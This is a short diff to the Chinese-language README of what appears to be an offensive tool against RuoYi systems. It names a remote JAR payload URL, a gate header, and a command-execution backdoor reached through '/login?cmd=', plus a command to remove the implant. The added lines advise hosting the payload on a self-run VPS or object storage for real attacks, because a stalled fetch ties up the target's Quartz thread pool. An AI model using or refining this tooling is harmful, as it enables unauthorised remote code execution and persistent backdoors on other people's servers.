@@ -21,6 +21,8 @@ https://raw.githubusercontent.com/tiaodan577-glitch/ry-gz-payload/main/g.jar
 - 门禁头: `X-Cmd-Ruoyi: 1`
 - 回显后门: `GET /login?cmd=<命令>`；卸马: `GET /login?cmd=delete`
 
+> ⚠️ 载荷 URL 必须**从目标机可达且稳定**。raw.githubusercontent.com 会抖/被墙，且目标 JVM 拉取挂起时会占满 quartz 线程池导致任务触发排队数分钟。实战建议 `--jar-url` 指自建镜像（VPS/对象存储）。
+
 ## CLI 用法
 
 ```bash
